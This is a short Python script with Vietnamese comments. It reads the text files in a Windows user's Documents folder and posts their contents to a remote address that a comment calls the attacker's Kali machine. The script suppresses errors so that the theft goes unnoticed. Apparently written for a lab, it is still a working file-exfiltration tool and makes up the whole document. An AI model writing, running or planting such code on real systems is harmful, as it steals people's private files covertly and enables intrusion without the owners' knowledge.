import os
import requests

# Lấy thư mục Documents của người dùng hiện tại
folder = os.path.join(os.environ['USERPROFILE'], "Documents")

# Duyệt qua các file .txt trong thư mục
for filename in os.listdir(folder):
    if filename.endswith(".txt"):
        filepath = os.path.join(folder, filename)
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read()
            
            # Gửi nội dung về máy Kali
            requests.post("http://192.168.40.128:8000", data={"data": content})
        except Exception as e:
            pass  # Không in lỗi, tránh lộ
